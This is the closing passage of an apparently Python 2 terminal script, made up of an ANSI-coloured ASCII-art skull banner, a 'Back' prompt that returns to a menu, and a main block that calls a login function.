\033[1;97m dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb
\033[1;97m V      ~"Mb          dOOOOOOOOOOOOOOOOOb          dM"~      V
\033[1;97m          `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
\033[1;97m           `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'
\033[1;97m      __     `YMMM| OP'~"YOOOOOOOOOOOP"~`YO |MMMP'     __
\033[1;97m    ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
\033[1;97m _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._
\033[1;97m
\033[1;97m             `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
\033[1;97m     ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
\033[1;97m   ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.
\033[1;97m  ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
\033[1;97m  MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
\033[1;97m  YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
\033[1;97m   `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'
\033[1;97m     `'                  `OObNNNNNdOO'                   `'
\033[1;97m                           `~OOOOO~'   
"""
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()

if __name__ == '__main__':
	login()
